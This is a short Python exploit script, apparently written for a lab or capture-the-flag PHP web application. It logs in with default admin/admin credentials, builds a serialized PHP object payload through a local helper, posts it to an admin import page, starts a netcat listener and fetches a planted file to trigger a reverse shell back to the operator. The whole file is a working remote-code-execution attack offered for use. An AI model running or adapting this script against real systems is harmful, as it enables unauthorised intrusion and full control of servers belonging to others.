import requests, sys, argparse, subprocess, re, time

s = requests.session()

def authenticate(ip, user, password):
	target = "http://%s/login.php" % ip
	data = {'username': user,
			'password': password}
	print("\n[+] Attempting to authenticate...")
	req = s.post(target, data=data, allow_redirects=True)
	res = req.text
	usermatch = re.search(r'<div class="center_div"></a>(.*?)<br>', res)
	if usermatch:
		output = usermatch.group(1)
		print(output)
	else:
		print("\n[!] Failed to authenticate.")
		sys.exit(-1)

def craftPayload(lhost, lport):
    print("\n[+] Crafting serialized payload...")
    cmd = "php serialize.php %s %s" % (lhost, lport)
    gen = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    object = gen.stdout.read().decode("UTF-8")
    return object

def rce(ip, lport, object):
    print("\n[+] Delivering crafted payload...")
    target = "http://%s" % ip
    data = {"userobj": object}
    s.post(target + "/admin/import_user.php", data=data)
    print("\n[+] Triggering payload...")
    subprocess.Popen(["nc","-lnvp","%s" % lport])
    time.sleep(1)
    s.get(target + "/rev.php")
    while True:
	    pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--lhost', help='Local host', required=True)
    parser.add_argument('--lport', help='Local port', required=True)
    args = parser.parse_args()
    ip = args.ip
    user = "admin"
    passwd = "admin"
    lhost = args.lhost
    lport = args.lport

    authenticate(ip, user, passwd)
    object = craftPayload(lhost, lport)
    rce(ip, lport, object)

if __name__ == "__main__":
	main()
